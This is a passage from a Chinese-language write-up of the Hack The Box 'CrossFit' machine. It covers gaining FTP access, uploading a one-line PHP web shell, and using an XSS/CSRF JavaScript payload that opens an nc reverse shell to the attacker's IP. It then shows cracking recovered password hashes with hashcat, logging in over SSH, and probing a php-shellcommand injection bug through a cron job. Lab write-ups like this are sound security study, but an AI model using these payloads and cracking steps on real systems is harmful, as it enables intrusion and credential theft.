class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>FTP Hosting - Account Management<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">&quot;https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.0.0-alpha/css/bootstrap.css&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;row&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col-lg-12 margin-tb&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;pull-left&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">h2</span>&gt;</span>FTP Hosting - Account Management<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;pull-right&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-success&quot;</span> <span class="attr">href</span>=<span class="string">&quot;http://ftp.crossfit.htb/accounts/create&quot;</span>&gt;</span> Create New Account<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;alert alert-success&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">p</span>&gt;</span>Account created successfully.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">table</span> <span class="attr">class</span>=<span class="string">&quot;table table-bordered&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>No<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>Username<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>Creation Date<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span> <span class="attr">width</span>=<span class="string">&quot;280px&quot;</span>&gt;</span>Action<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>1<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>tari<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>2021-08-14 07:39:54<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://ftp.crossfit.htb/accounts/72&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-info&quot;</span> <span class="attr">href</span>=<span class="string">&quot;http://ftp.crossfit.htb/accounts/72&quot;</span>&gt;</span>Show<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-primary&quot;</span> <span class="attr">href</span>=<span class="string">&quot;http://ftp.crossfit.htb/accounts/72/edit&quot;</span>&gt;</span>Edit<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;_token&quot;</span> <span class="attr">value</span>=<span class="string">&quot;BO5j5UOlBonjTsv0Y317c3t3G1JJyoZ6hdbw6cLm&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;_method&quot;</span> <span class="attr">value</span>=<span class="string">&quot;DELETE&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-danger&quot;</span>&gt;</span>Delete<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>2<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>sheeraz<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>2021-08-14 07:32:44<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://ftp.crossfit.htb/accounts/71&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-info&quot;</span> <span class="attr">href</span>=<span class="string">&quot;http://ftp.crossfit.htb/accounts/71&quot;</span>&gt;</span>Show<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-primary&quot;</span> <span class="attr">href</span>=<span class="string">&quot;http://ftp.crossfit.htb/accounts/71/edit&quot;</span>&gt;</span>Edit<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;_token&quot;</span> <span class="attr">value</span>=<span class="string">&quot;BO5j5UOlBonjTsv0Y317c3t3G1JJyoZ6hdbw6cLm&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;_method&quot;</span> <span class="attr">value</span>=<span class="string">&quot;DELETE&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-danger&quot;</span>&gt;</span>Delete<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>创建成功了。</p><p><img src="/img/htb-crossfit/image-20210814154222759.png" class="lazyload" data-srcset="/img/htb-crossfit/image-20210814154222759.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210814154222759"></p><p>之前说过，这个应该是网站部署的vsftp帐号，尝试通过 tari/tari 登录</p><p><img src="/img/htb-crossfit/image-20210814155722576.png" class="lazyload" data-srcset="/img/htb-crossfit/image-20210814155722576.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210814155722576"></p><p>命令行的话需要下载 lftp 才能连，ftp没有支持 SSL协议</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> ftp:ssl-force <span class="literal">true</span></span><br><span class="line"><span class="built_in">set</span> ssl:verify-certificate no</span><br><span class="line">connect 10.10.10.208</span><br><span class="line">login tari tari</span><br></pre></td></tr></table></figure><p><img src="/img/htb-crossfit/image-20210814160858543.png" class="lazyload" data-srcset="/img/htb-crossfit/image-20210814160858543.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210814160858543"></p><p>连不了。。？不是，那我图形化怎么连上的？…. emm，过了两个小时又可以了，晕（破案了，好像机器会每隔一段时间清理用户和文件之类的，要重新打一下添加用户，然后就可以正常了~）</p><p><img src="/img/htb-crossfit/image-20210814184926796.png" class="lazyload" data-srcset="/img/htb-crossfit/image-20210814184926796.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210814184926796"></p><p>看了下权限，除了 <code>development-test</code> 目录其他没法写权限。</p><h3 id="GetShell"><a href="#GetShell" class="headerlink" title="GetShell"></a>GetShell</h3><p>先写个PHP一句话进去，s.php 内容为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> system(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;s&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>根据命名规则，先试试 <code>development-test.crossfit.htb</code> 可不可以通过外网访问</p><p><img src="/img/htb-crossfit/image-20210814185306387.png" class="lazyload" data-srcset="/img/htb-crossfit/image-20210814185306387.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210814185306387"></p><p>意料之中无法访问</p><p><img src="/img/htb-crossfit/image-20210814163119126.png" class="lazyload" data-srcset="/img/htb-crossfit/image-20210814163119126.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210814163119126"></p><p>没事，我们文件上传上去了，可以通过 XSS+CSRF让管理员帮我们访问 （</p><p>payload5.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xhr.open(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;http://development-test.crossfit.htb/s.php?s=nc+10.10.14.4+2233+-e+/bin/bash&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">xhr.send();</span><br></pre></td></tr></table></figure><p>成功反弹shell（一开始弹了半天，结果发现环境好像每隔一段时间会重置的….毕竟是共享环境2333）</p><p><img src="/img/htb-crossfit/image-20210814192606606.png" class="lazyload" data-srcset="/img/htb-crossfit/image-20210814192606606.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210814192606606"></p><p>获取一个TTY shell，不然到时候提权了用户都切不了 （</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span>; </span><br></pre></td></tr></table></figure><h2 id="阶段总结"><a href="#阶段总结" class="headerlink" title="阶段总结"></a>阶段总结</h2><p>原本对同源策略、JSONP、httponly搞的模模糊糊的，以及他们的作用范围和利用方法，经过环境的调试，在看看以前看过的文章，怎样可行，怎样不可行，终于理解清楚了~</p><h2 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h2><h3 id="权限提升-获取普通用户权限"><a href="#权限提升-获取普通用户权限" class="headerlink" title="权限提升 - 获取普通用户权限"></a>权限提升 - 获取普通用户权限</h3><ul><li><p><a href="https://github.com/diego-treitos/linux-smart-enumeration">linux-smart-enumeration</a> 没找到啥有用的</p></li><li><p><a href="https://github.com/mzet-/linux-exploit-suggester">linux_exploit_suggester</a> 报了个错</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./linux-exploit-suggester.sh: line xxxx: cannot create temp file for here-document: No such file or directory</span><br></pre></td></tr></table></figure><p><a href="https://github.com/mzet-/linux-exploit-suggester/issues/55">解决方式传送门</a></p><p>也没找到啥好用的，</p><ul><li><a href="https://github.com/jondonas/linux-exploit-suggester-2">linux_exploit_suggester-2</a> 也是没找到啥</li></ul><p>从系统中找所有用户可读文件，这也太多了吧（</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -xdev -<span class="built_in">type</span> d -perm -0001 -ls</span><br></pre></td></tr></table></figure><p>这个思路挺好的，看到 ansible 去找 playbook，不过就是输出太多，很容器看漏的…</p><p>这里安利一个开源项目</p><p><a href="https://github.com/carlospolop/PEASS-ng">https://github.com/carlospolop/PEASS-ng</a></p><p>通过linpeas 很容易发现了个街上最靓的仔<br><img src="/img/htb-crossfit/image-20210814220220687.png" class="lazyload" data-srcset="/img/htb-crossfit/image-20210814220220687.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210814220220687"></p><p>此外还发现了个isaac用户的计划任务，不过这个文件要 admins组才能编辑</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*  *    * * *    isaac    /usr/bin/php /home/isaac/send_updates/send_updates.php</span><br></pre></td></tr></table></figure><p>看一下文件，好像很厉害的权限的样子（竟然不是 root</p><p><img src="/img/htb-crossfit/image-20210814222201159.png" class="lazyload" data-srcset="/img/htb-crossfit/image-20210814222201159.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210814222201159"></p><p>内核漏洞没有，看来只能爆破哈希了 （</p><p>有两个</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/www/ftp/database/factories/UserFactory.php:$2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi</span><br></pre></td></tr></table></figure><p>帐号是 <code>hank</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/ansible/playbooks/adduser_hank.yml:$6$e20D6nUeTJOIyRio$A777Jj8tk5.sfACzLuIqqfZOCsKTVCfNEQIbH79nZf09mM.Iov/pzDCE8xNZZCM9MuHKMcjqNUd8QUEzC1CZG/</span><br></pre></td></tr></table></figure><p>谷歌一下前面的 <code>$2y</code> 和 <code>$6</code> 特征，发现维基上有总结<sup><a href="https://en.wikipedia.org/wiki/Crypt_(C)">[7]</a></sup></p><table><thead><tr><th align="left">Scheme id</th><th align="left">Schema</th><th align="left">Example</th></tr></thead><tbody><tr><td align="left"></td><td align="left"><a href="https://en.wikipedia.org/wiki/Data_Encryption_Standard">DES</a></td><td align="left"><code>Kyq4bCxAXJkbg</code></td></tr><tr><td align="left">_</td><td align="left"><a href="https://en.wikipedia.org/wiki/Berkeley_Software_Design">BSDi</a></td><td align="left"><code>_EQ0.jzhSVeUyoSqLupI</code></td></tr><tr><td align="left">1</td><td align="left">MD5</td><td align="left"><code>$1$etNnh7FA$OlM7eljE/B7F1J4XYNnk81</code></td></tr><tr><td align="left">2, 2a, 2x, 2y</td><td align="left"><a href="https://en.wikipedia.org/wiki/Bcrypt">bcrypt</a></td><td align="left"><code>$2a$10$VIhIOofSMqgdGlL4wzE//e.77dAQGqntF/1dT7bqCrVtquInWy2qi</code></td></tr><tr><td align="left">3</td><td align="left"><a href="https://en.wikipedia.org/wiki/NTLM_Authentication">NTHASH</a></td><td align="left"><code>$3$$8846f7eaee8fb117ad06bdd830b7586c</code></td></tr><tr><td align="left">5</td><td align="left"><a href="https://en.wikipedia.org/wiki/SHA-2">SHA-256</a></td><td align="left"><code>$5$9ks3nNEqv31FX.F$gdEoLFsCRsn/WRN3wxUnzfeZLoooVlzeF4WjLomTRFD</code></td></tr><tr><td align="left">6</td><td align="left"><a href="https://en.wikipedia.org/wiki/SHA-2">SHA-512</a></td><td align="left"><code>$6$qoE2letU$wWPRl.PVczjzeMVgjiA8LLy2nOyZbf7Amj3qLIL978o18gbMySdKZ7uepq9tmMQXxyTIrS12Pln.2Q/6Xscao0</code></td></tr><tr><td align="left">md5</td><td align="left">Solaris MD5</td><td align="left"><code>$md5,rounds=5000$GUBv0xjJ$$mSwgIswdjlTY0YxV7HBVm0</code></td></tr><tr><td align="left">sha1</td><td align="left"><a href="https://en.wikipedia.org/wiki/PBKDF1">PBKDF1</a> with <a href="https://en.wikipedia.org/wiki/SHA-1">SHA-1</a></td><td align="left"><code>$sha1$40000$jtNX3nZ2$hBNaIXkt4wBI2o5rsi8KejSjNqIq</code></td></tr><tr><td align="left">y</td><td align="left"><a href="https://en.wikipedia.org/wiki/Yescrypt">yescrypt</a></td><td align="left"><code>$y$j9T$F5Jx5fExrKuPp53xLKQ..1$X3DX6M94c7o.9agCG9G317fhZg9SqC.5i5rd.RhAtQ7</code></td></tr></tbody></table><p>对应两个哈希方式分别为 <code>bcrypt</code> 和 <code>SHA-512</code></p><p>按之前玩国外CTF和靶机的经验，国外弱口令破解一般用 <code>rockyou.txt</code> ( kali 自动 <code>sudo find / | grep rockyou.txt</code>)</p><p>在 hashcat 上找对应哈希算法的值</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">hashcat --example-hashes | grep -i -A 1 -B 1 bcrypt</span><br><span class="line"><span class="comment"># 输出</span></span><br><span class="line"><span class="comment"># MODE: 3200</span></span><br><span class="line"><span class="comment"># TYPE: bcrypt $2*$, Blowfish (Unix)</span></span><br><span class="line"><span class="comment"># HASH: $2a$05$MBCzKhG1KhezLh.0LRa0Kuw12nLJtpHy6DIaU.JAnqJUDYspHC.Ou</span></span><br><span class="line">hashcat --example-hashes | grep -i -A 1 -B 1 sha512</span><br><span class="line"><span class="comment"># 从输出中找到</span></span><br><span class="line"><span class="comment"># MODE: 1800</span></span><br><span class="line"><span class="comment"># TYPE: sha512crypt $6$, SHA512 (Unix)</span></span><br><span class="line"><span class="comment"># HASH: $6$72820166$U4DVzpcYxgw7MVVDGGvB2/H5lRistD5.Ah4upwENR5UtffLR4X4SxSzfREv8z6wVl0jRFX40/KnYVvK4829kD1</span></span><br></pre></td></tr></table></figure><p>先试试 <code>bcrypt</code> 看着没那么费时间，没解出来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 3200 crossfit_bcrypt ~/Sec/Web/selffuzz/rockyou.txt -r /usr/<span class="built_in">local</span>/Cellar/hashcat/6.1.1/share/doc/hashcat/rules/best64.rule --force</span><br></pre></td></tr></table></figure><ul><li>-m 哈希类型，通过 –example-hashes 查到的</li><li>crossfit_bcrypt 为文件，内容为我们要破解的哈希 <code>$2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi</code></li><li>-r 规则，即对原有字典的一些替换、移位和变异等<sup><a href="https://hashcat.net/wiki/doku.php?id=rule_based_attack">[8]</a></sup>，kali 上文件在 <code>/usr/share/hashcat/rules/best64.rule</code></li><li>–force 忽略警告</li></ul><p>SHA-512 破解得密码：<code>powerpuffgirls</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 1800 crossfit_sha512 ~/Sec/Web/selffuzz/rockyou.txt -r /usr/local/Cellar/hashcat/6.1.1/share/doc/hashcat/rules/best64.rule --force</span><br></pre></td></tr></table></figure><p><img src="/img/htb-crossfit/image-20210815114056833.png" class="lazyload" data-srcset="/img/htb-crossfit/image-20210815114056833.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210815114056833"></p><p>ssh 登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh hank@10.10.10.208 </span><br></pre></td></tr></table></figure><p><img src="/img/htb-crossfit/image-20210815120536153.png" class="lazyload" data-srcset="/img/htb-crossfit/image-20210815120536153.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210815120536153"></p><h3 id="权限提升-获取同组用户权限-（可选）"><a href="#权限提升-获取同组用户权限-（可选）" class="headerlink" title="权限提升 - 获取同组用户权限 （可选）"></a>权限提升 - 获取同组用户权限 （可选）</h3><h4 id="命令执行利用"><a href="#命令执行利用" class="headerlink" title="命令执行利用"></a>命令执行利用</h4><ul><li><p><code>/home/hank/</code>有个 user.txt 不知道是啥来的，扔 cmd5 查不到</p></li><li><p>发现可查看 isaac 用户的文件，里面有 send_updates/send_updates.php，刚好与 linpeas 发现的计划任务（/etc/crontab）对应，会每隔一分钟执行一遍，不过同组不可编辑，<code>require</code>进来的 includes/ 目录不可查看。该文件使用了一个外部依赖 <code>use mikehaertl\shellcommand\Command;</code>，发现一个外部可控的参数，<code>$command-&gt;addArg($row[&#39;email&#39;], $escape=true);</code> 不过好像进行转义了</p></li></ul><p>说起邮件，突然想起这个页面 <a href="http://gym-club.crossfit.htb/jointheclub.php">http://gym-club.crossfit.htb/jointheclub.php</a> ，难道说，就是提取的这个邮箱发送东西的？</p><p><img src="/img/htb-crossfit/image-20210815123203733.png" class="lazyload" data-srcset="/img/htb-crossfit/image-20210815123203733.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210815123203733"></p><ul><li>原来 send_updates 也是用 Laravel 写的，查看 composer.json，发现  <code>&quot;mikehaertl/php-shellcommand&quot;: &quot;1.6.0&quot;</code> 版本为 1.6.0。</li></ul><p>先查查这个组件这个版本有没有nday，谷歌一下 <code>mikehaertl/php-shellcommand 1.6.0</code>，果然有<sup><a href="https://snyk.io/vuln/SNYK-PHP-MIKEHAERTLPHPSHELLCOMMAND-538426">[9]</a></sup>，</p><p><a href="https://github.com/mikehaertl/php-shellcommand/issues/44">issue44</a> 给出了两种利用方式，我们这是邮箱可控（<code>$key</code>），没有传入 <code>value</code> 值，并通过 <code>addArg</code> 指定了 <code>$escape=true</code>，好像，，，利用不了？见<a href="#3%E3%80%81PHP%E6%8C%87%E5%AE%9A%E5%BD%A2%E6%95%B0%EF%BC%8C%E4%BC%A0%E5%85%A5%E7%9A%84%E4%B8%8D%E6%98%AF%E6%8C%87%E5%AE%9A%E7%9A%84%E5%BD%A2%E5%8F%82">遇到的问题3</a> ，也就是 <code>$escape</code> 当作 <code>$value</code> 传入，导致 <code>$key</code> 没有被转移，进而导致命令注入</p><p>整理下思路：先看看 <code>$row[&#39;email&#39;]</code> 可不可控，如果可控则可通过 isaac 身份执行的计划任务执行命令</p><p>尝试了一下，看了源码，<code>filter_var($email, FILTER_VALIDATE_EMAIL)</code> 可以进行绕过，不过好像插入了没反应，突然想到应该确认是不是真的写进去了，<code>db.php</code> 发现数据库密码，直接连上去</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -ucrossfit -p<span 